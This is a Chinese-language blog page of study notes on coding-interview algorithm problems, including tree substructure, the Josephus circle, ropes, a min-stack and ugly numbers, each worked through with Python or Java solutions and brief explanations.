<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    Node pre, head;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Node <span class="title">treeToDoublyList</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        inorderTraversal(root);</span><br><span class="line">        head.left = pre;</span><br><span class="line">        pre.right = head;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorderTraversal</span><span class="params">(Node cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        inorderTraversal(cur.left);</span><br><span class="line">        <span class="keyword">if</span>(pre != <span class="keyword">null</span>)&#123;</span><br><span class="line">            pre.right = cur;</span><br><span class="line">            cur.left = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            head = cur;</span><br><span class="line">            pre = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        inorderTraversal(cur.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="树的子结构"   >
          <a href="#树的子结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#树的子结构" class="headerlink" title="树的子结构"></a>树的子结构</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221017231434539.png" alt="image-20221017231434539"></p>
<p>先找到结点数值相同的结点</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findNode</span>(<span class="params">self, rootA: TreeNode, rootB: TreeNode</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(rootA == <span class="literal">None</span> <span class="keyword">or</span> rootB == <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span>(rootA.val != rootB.val):<span class="comment">#先找到</span></span><br><span class="line">        <span class="keyword">return</span> self.findNode(rootA.left, rootB) <span class="keyword">or</span> self.findNode(rootA.right, rootB)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#.....找到了就判断</span></span><br></pre></td></tr></table></div></figure>

<p>判断</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span>(<span class="params">self,rootA: TreeNode,rootB: TreeNode</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(rootB == <span class="literal">None</span>):<span class="comment">#遍历到最后了代表一致</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span>(rootA == <span class="literal">None</span>):<span class="comment">#A遍历完还没有代表没有</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span>(rootA.val == rootB.val <span class="keyword">and</span> self.judge(rootA.left,rootB.left) <span class="keyword">and</span> self.judge(rootA.right,rootB.right)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></div></figure>

<p>最终结果</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">judge</span>(<span class="params">self,rootA: TreeNode,rootB: TreeNode</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(rootB == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span>(rootA == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span>(rootA.val == rootB.val <span class="keyword">and</span> self.judge(rootA.left,rootB.left) <span class="keyword">and</span> self.judge(rootA.right,rootB.right)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findNode</span>(<span class="params">self, rootA: TreeNode, rootB: TreeNode</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(rootA == <span class="literal">None</span> <span class="keyword">or</span> rootB == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span>(rootA.val != rootB.val):<span class="comment">#先找到</span></span><br><span class="line">            <span class="keyword">return</span> self.findNode(rootA.left, rootB) <span class="keyword">or</span> self.findNode(rootA.right, rootB)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span>  self.judge(rootA.left,rootB.left) <span class="keyword">and</span> self.judge(rootA.right,rootB.right)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#注意开始的头节点</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isSubStructure</span>(<span class="params">self, A: TreeNode, B: TreeNode</span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(A == <span class="literal">None</span> <span class="keyword">or</span> B == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span>(A.val == B.val):</span><br><span class="line">            <span class="keyword">if</span>(self.judge(A,B) == <span class="literal">False</span>):</span><br><span class="line">                A.val = B.val + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> self.findNode(A, B)</span><br></pre></td></tr></table></div></figure>


        <h2 id="圆圈中最后剩下的数字"   >
          <a href="#圆圈中最后剩下的数字" class="heading-link"><i class="fas fa-link"></i></a><a href="#圆圈中最后剩下的数字" class="headerlink" title="圆圈中最后剩下的数字"></a>圆圈中最后剩下的数字</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221018214142551.png" alt="image-20221018214142551"></p>
<p>约瑟夫环问题，详情参考如下</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/solution/huan-ge-jiao-du-ju-li-jie-jue-yue-se-fu-huan-by-as/" >换个角度举例解决约瑟夫环 - 圆圈中最后剩下的数字 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/solution/jian-zhi-offer-62-yuan-quan-zhong-zui-ho-dcow/" >剑指 Offer 62. 圆圈中最后剩下的数字（数学 / 动态规划，清晰图解） - 圆圈中最后剩下的数字 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>对于<code>f(n,m)</code>问题，固定m，对n做规律，得到状态转换方程</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp[n] = (dp[n-1] + m) % n</span><br><span class="line">dp[1] = 0</span><br></pre></td></tr></table></div></figure>

<p>由此可得代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lastRemaining</span>(<span class="params">self, n: <span class="built_in">int</span>, m: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        dp = [<span class="number">0</span>] * (n+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            dp[i] = (dp[i-<span class="number">1</span>] + m) % i</span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br></pre></td></tr></table></div></figure>


        <h2 id="青蛙跳台阶问题"   >
          <a href="#青蛙跳台阶问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#青蛙跳台阶问题" class="headerlink" title="青蛙跳台阶问题"></a>青蛙跳台阶问题</h2>
      <p>即类似之前的合并问题，<strong>把数字翻译成字符串</strong></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221018215836305.png" alt="image-20221018215836305"></p>
<p>即推导一下，设每个台阶为1，每两个1台阶相邻可以选择合并为一个2台阶，那么假定如下台阶</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111 选择合并之后总数为dp(5)</span><br></pre></td></tr></table></div></figure>

<p>此时如果加入一级台阶，有两种情况</p>
<ul>
<li>与前一个台阶合并：<code>1111 2</code></li>
<li>不合并：<code>11111 1</code></li>
</ul>
<p>即<code>dp(6) = dp(4) + dp(5)</code>，由此可得动态规划</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dp(0) = 1</span><br><span class="line">dp(1) = 1</span><br><span class="line">dp(2) = dp(0) + dp(1) = 2</span><br><span class="line">dp(n) = dp(n-1) + dp(n-2)</span><br></pre></td></tr></table></div></figure>

<p>依据动态规划得到解</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numWays</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span> <span class="keyword">or</span> n == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        dp = [<span class="number">0</span>] * (n+<span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            dp[i] = dp[i-<span class="number">1</span>] + dp[i-<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[n] % <span class="number">1000000007</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="剪绳子"   >
          <a href="#剪绳子" class="heading-link"><i class="fas fa-link"></i></a><a href="#剪绳子" class="headerlink" title="剪绳子"></a>剪绳子</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221019112511996.png" alt="image-20221019112511996"></p>
<p>可用动态规划，dp[n]为将长度为n的绳子拆分为至少两截之后的乘积。假定将绳子拆分为<code>j</code>和剩下的<code>n-j</code>，那么如下</p>
<ul>
<li><p>将<code>n</code>拆分成j和<code>n-j</code>的和，且<code>n-j</code>不再拆分成多个正整数，此时的乘积是<code>dp[n] = j * (n-j)</code></p>
</li>
<li><p>将<code>n</code>拆分成j和<code>n-j</code>的和，且<code>n-j</code>可以拆分成多个正整数，此时的乘积是<code>dp[n] = j * dp[n-j]</code></p>
</li>
</ul>
<p>综上可得如下结果</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[n] = j * max(n-j,dp[n-j])</span><br></pre></td></tr></table></div></figure>

<p>然后定义初始状态</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dp[0] = 0</span><br><span class="line">dp[1] = 0</span><br><span class="line">dp[2] = 1</span><br></pre></td></tr></table></div></figure>

<p>可得最终代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cuttingRope</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        dp = [<span class="number">0</span>] * (n+<span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">        dp[<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span> <span class="keyword">or</span> n == <span class="number">1</span> <span class="keyword">or</span> n == <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">return</span> dp[n]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,i):</span><br><span class="line">                dp[i] = <span class="built_in">max</span>(dp[i],j*(i-j),j*dp[i-j])</span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br></pre></td></tr></table></div></figure>

<p>需要注意的是，遍历j的过程中，由于<code>dp[i]</code>会被重复计算，所以需要把<code>dp[i]</code>也加入进行判断，防止最大值被覆盖。</p>

        <h2 id="包含min函数的栈"   >
          <a href="#包含min函数的栈" class="heading-link"><i class="fas fa-link"></i></a><a href="#包含min函数的栈" class="headerlink" title="包含min函数的栈"></a>包含min函数的栈</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221019151036307.png" alt="image-20221019151036307"></p>
<p>定义辅助栈，存放非严格递减元素，参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/bao-han-minhan-shu-de-zhan-lcof/solution/mian-shi-ti-30-bao-han-minhan-shu-de-zhan-fu-zhu-z/" >面试题30. 包含 min 函数的栈（辅助栈，清晰图解） - 包含min函数的栈 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/f31f4b7f5e91d46ea610b6685c593e12bf798a9b8336b0560b6b520956dd5272-Picture1.png" alt="img"></p>
<p>然后在<code>pop</code>和<code>push</code>函数中进行一下判断即可</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.stackA, self.stackB = [], []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span>(<span class="params">self, x: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.stackA.append(x)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(self.stackB) == <span class="number">0</span> <span class="keyword">or</span> self.stackB[-<span class="number">1</span>] &gt;= x):</span><br><span class="line">            self.stackB.append(x)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        tmp = self.stackA.pop()</span><br><span class="line">        <span class="keyword">if</span>(tmp == self.stackB[-<span class="number">1</span>]):</span><br><span class="line">            self.stackB.pop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">top</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.stackA[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">min</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.stackB[-<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>




        <h2 id="调整数组顺序使奇数位于偶数前面"   >
          <a href="#调整数组顺序使奇数位于偶数前面" class="heading-link"><i class="fas fa-link"></i></a><a href="#调整数组顺序使奇数位于偶数前面" class="headerlink" title="调整数组顺序使奇数位于偶数前面"></a>调整数组顺序使奇数位于偶数前面</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221019152724383.png" alt="image-20221019152724383"></p>
<p>双指针或直接新数组</p>
<ul>
<li>新数组</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exchange</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        newJiNums = []</span><br><span class="line">        newOuNums = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">1</span>):</span><br><span class="line">                newJiNums.append(i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                newOuNums.append(i)</span><br><span class="line">        <span class="keyword">return</span> newJiNums + newOuNums</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<ul>
<li>双指针</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exchange</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; j):</span><br><span class="line">            <span class="keyword">while</span>(i &lt; j <span class="keyword">and</span> nums[i] % <span class="number">2</span> == <span class="number">1</span>):</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span>(i &lt; j <span class="keyword">and</span> nums[j] % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                j -= <span class="number">1</span></span><br><span class="line">            nums[i],nums[j] = nums[j],nums[i]</span><br><span class="line">        <span class="keyword">return</span> nums</span><br></pre></td></tr></table></div></figure>




        <h2 id="丑数"   >
          <a href="#丑数" class="heading-link"><i class="fas fa-link"></i></a><a href="#丑数" class="headerlink" title="丑数"></a>丑数</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221020143110808.png" alt="image-20221020143110808"></p>
<p>刚开始想着行不行保存状态，a,b,c保存状态，初始化为0，然后每次将这三个数尝试递增之后，计算<code>tmp = min((a+1)*2,(b+1)*3,(c+1)*5)</code>，然后取最小值，之后再判断是哪一个，将对应的<code>a/b/c</code>加一即可。</p>
<p>然后由于<code>a+1/b+1/c+1</code>可能会出现包含除2,3,5之外的质因子，所以需要进行判断，判断其最大的质因子是否大于5即可，如果大于5，则不能要这个数。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_num_factors</span>(<span class="params">self,num</span>):</span></span><br><span class="line">        hashSet = <span class="built_in">set</span>()</span><br><span class="line">        tmp = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(num &lt; tmp):</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">while</span> (num &gt;= tmp):</span><br><span class="line">            k = num % tmp</span><br><span class="line">            <span class="keyword">if</span> (k == <span class="number">0</span>):</span><br><span class="line">                hashSet.add(tmp)</span><br><span class="line">                num = num / tmp  <span class="comment"># 更新</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = tmp + <span class="number">1</span>  <span class="comment"># 同时更新除数值，不必每次都从头开始</span></span><br><span class="line">        hashList = <span class="built_in">list</span>(hashSet)</span><br><span class="line">        <span class="keyword">return</span> hashList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nthUglyNumber</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        a,b,c = <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        tmp = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">        dp = [<span class="number">1</span>] * (n+<span class="number">1</span>)</span><br><span class="line">        i = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; n+<span class="number">1</span>):</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            tmp = <span class="built_in">min</span>((a+<span class="number">1</span>)*<span class="number">2</span>,(b+<span class="number">1</span>)*<span class="number">3</span>,(c+<span class="number">1</span>)*<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span>(tmp == (a+<span class="number">1</span>)*<span class="number">2</span>):</span><br><span class="line">                tmpList = self.get_num_factors(a+<span class="number">1</span>)</span><br><span class="line">                tmpList.sort()</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">len</span>(tmpList) &gt; <span class="number">0</span> <span class="keyword">and</span> tmpList[-<span class="number">1</span>] &gt; <span class="number">5</span>):</span><br><span class="line">                    a += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">not</span> flag):</span><br><span class="line">                        i += <span class="number">1</span></span><br><span class="line">                        flag = <span class="number">1</span></span><br><span class="line">                    a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(tmp == (b+<span class="number">1</span>)*<span class="number">3</span>):</span><br><span class="line">                tmpList = self.get_num_factors(b+<span class="number">1</span>)</span><br><span class="line">                tmpList.sort()</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">len</span>(tmpList) &gt; <span class="number">0</span> <span class="keyword">and</span> tmpList[-<span class="number">1</span>] &gt; <span class="number">5</span>):</span><br><span class="line">                    b += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">not</span> flag):</span><br><span class="line">                        i += <span class="number">1</span></span><br><span class="line">                        flag = <span class="number">1</span></span><br><span class="line">                    b += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(tmp == (c+<span class="number">1</span>)*<span class="number">5</span>):</span><br><span class="line">                tmpList = self.get_num_factors(c+<span class="number">1</span>)</span><br><span class="line">                tmpList.sort()</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">len</span>(tmpList) &gt; <span class="number">0</span> <span class="keyword">and</span> tmpList[-<span class="number">1</span>] &gt; <span class="number">5</span>):</span><br><span class="line">                    c += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">not</span> flag):</span><br><span class="line">                        i += <span class="number">1</span></span><br><span class="line">                        flag = <span class="number">1</span></span><br><span class="line">                    c += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(flag):</span><br><span class="line">                dp[i-<span class="number">1</span>] = tmp</span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br></pre></td></tr></table></div></figure>

<p>时间复杂度为<code>O(n^2)</code>，会超时，后面看题解用动态规划才行，参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/chou-shu-lcof/solution/mian-shi-ti-49-chou-shu-dong-tai-gui-hua-qing-xi-t/" >剑指 Offer 49. 丑数（动态规划，清晰图解） - 丑数 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>需要明确一点就是，所有的丑数都是前面的某个丑数乘以某个数得到的，这个某个数也必定是某个丑数，不然就会存在非1,2,3,5的质因子了。</p>
